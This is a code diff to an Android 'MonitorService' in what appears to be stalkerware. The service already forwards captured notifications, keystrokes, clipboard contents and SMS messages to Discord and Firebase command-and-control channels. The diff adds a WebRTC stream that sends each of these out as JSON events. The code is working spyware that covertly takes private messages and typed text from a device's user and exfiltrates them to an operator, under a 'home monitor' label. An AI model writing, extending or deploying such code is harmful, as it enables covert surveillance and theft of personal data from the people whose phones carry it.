@@ -52,6 +52,15 @@ class MonitorService : LifecycleService() {
             DiscordC2Engine.sendDiscordStreamNotification(appName, title, text)
             activeInstance?.firebaseC2Engine?.uploadTelemetryLog("notifications", "[$appName] $title: $text")
             activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("notifications", "[$appName] $title: $text") }
+            activeInstance?.let { inst ->
+                val payload = JSONObject().apply {
+                    put("appName", appName)
+                    put("title", title)
+                    put("text", text)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "notifications.stream", payload)
+            }
         }
 
         fun sendDiscordStreamNotification(appName: String, title: String = "", text: String = "") {
@@ -62,6 +71,14 @@ class MonitorService : LifecycleService() {
             DiscordC2Engine.sendDiscordStreamKeylog(appName, text)
             activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[$appName] $text")
             activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[$appName] $text") }
+            activeInstance?.let { inst ->
+                val payload = JSONObject().apply {
+                    put("appName", appName)
+                    put("text", text)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "keylogs.stream", payload)
+            }
         }
 
         fun sendDiscordStreamKeylog(appName: String, text: String) {
@@ -72,6 +89,13 @@ class MonitorService : LifecycleService() {
             DiscordC2Engine.sendDiscordStreamClipboard(clipData)
             activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[Clipboard] $clipData")
             activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[Clipboard] $clipData") }
+            activeInstance?.let { inst ->
+                val payload = JSONObject().apply {
+                    put("clipData", clipData)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "clipboard.stream", payload)
+            }
         }
 
         fun sendDiscordStreamClipboard(clipData: String) {
@@ -82,6 +106,14 @@ class MonitorService : LifecycleService() {
             DiscordC2Engine.sendDiscordStreamSms(sender, body)
             activeInstance?.firebaseC2Engine?.uploadSocialMessage("sms", sender, body, isOutgoing = false)
             activeInstance?.let { C2LocalDatabase.getInstance(it).insertSocialMessage("sms", sender, body, isOutgoing = false) }
+            activeInstance?.let { inst ->
+                val payload = JSONObject().apply {
+                    put("sender", sender)
+                    put("body", body)
+                    put("timestamp", System.currentTimeMillis())
+                }
+                com.homemonitor.DeviceApiDispatcher(inst).dispatchStreamEvent(inst.webRtcEngine, "sms.stream", payload)
+            }
         }
 
         fun sendDiscordStreamSms(sender: String, body: String) {
